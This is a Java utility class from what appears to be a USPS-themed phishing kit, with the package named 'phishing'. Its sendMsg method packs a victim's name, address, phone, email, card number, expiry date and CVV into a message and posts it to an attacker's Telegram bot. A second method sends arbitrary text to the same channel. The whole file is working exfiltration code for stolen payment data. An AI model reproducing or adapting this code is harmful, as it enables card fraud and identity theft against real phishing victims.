package com.uspsassa.phishing.common.utils;

import cn.hutool.core.lang.Console;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import com.uspsassa.phishing.vo.FishVo;

import java.util.HashMap;
import java.util.Map;

public class TelegramUtil {
    /**
     * 推送消息至机器人
     *
     * @param fishVo
     * @param telegramToken
     * @param telegramId
     */
    public static void sendMsg(FishVo fishVo, String telegramToken, String telegramId) {
        String url = "https://api.telegram.org/bot"+telegramToken+"/sendMessage";
        Map<String, Object> paramMap = new HashMap<>();
        paramMap.put("chat_id", telegramId);
        //获取fishVo的内容
        String stringBuffer = "名称：" + fishVo.getName() +
                "\n地址：" + fishVo.getAddress() +
                "\n可选地址：" + fishVo.getAddressOption() +
                "\n邮政编码：" + fishVo.getZipCode() +
                "\n城市：" + fishVo.getCity() +
                "\n电话：" + fishVo.getPhoneNumber() +
                "\n邮箱：" + fishVo.getEmail() +
                "\n卡号：" + fishVo.getCardNumber() +
                "\n过期时间：" + fishVo.getExpDate() +
                "\ncvv：" + fishVo.getSecurityCode();
        paramMap.put("text", stringBuffer);
        //链式构建请求
        String result2 = HttpRequest.post(url)
                .header(Header.CONTENT_TYPE, "application/json")//头信息，多个头信息多次调用此方法即可
                .body(JSONUtil.toJsonStr(paramMap))//表单内容
                .timeout(20000)//超时，毫秒
                .execute().body();
        Console.log(result2);
    }
    /**
     * 推送消息至机器人
     *
     * @param text
     * @param telegramToken
     * @param telegramId
     */
    public static void sendMsg(String text, String telegramToken, String telegramId) {
        String url = "https://api.telegram.org/bot" + telegramToken + "/sendMessage";
        Map<String, Object> paramMap = new HashMap<>();
        paramMap.put("chat_id", telegramId);
        paramMap.put("text", text);
        //链式构建请求
        String result2 = HttpRequest.post(url)
                .header(Header.CONTENT_TYPE, "application/json")//头信息，多个头信息多次调用此方法即可
//                .setHttpProxy("127.0.0.1", 7890)
                .body(JSONUtil.toJsonStr(paramMap))//表单内容
                .timeout(20000)//超时，毫秒
                .execute().body();
        if (result2.contains("\"ok\":true")) {
            Console.log("推送成功");
        } else {
            throw new RuntimeException("推送失败");
        }
    }


}
